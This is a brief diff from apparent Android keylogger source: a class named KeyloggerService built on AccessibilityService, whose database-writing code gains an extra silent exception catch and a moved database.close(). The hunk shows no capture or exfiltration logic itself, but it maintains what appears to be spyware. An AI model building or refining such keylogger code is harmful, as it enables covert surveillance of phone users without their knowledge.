@@ -44,11 +44,11 @@ public class KeyloggerService extends AccessibilityService {
                         database.setTransactionSuccessful();
                     } catch (SQLException e) {
                         //die silent
+                    }catch(IllegalStateException e){
                     } finally {
                         database.endTransaction();
+                        database.close();
                     }
-                    database.close();
-
                 }
             }).start();
         }
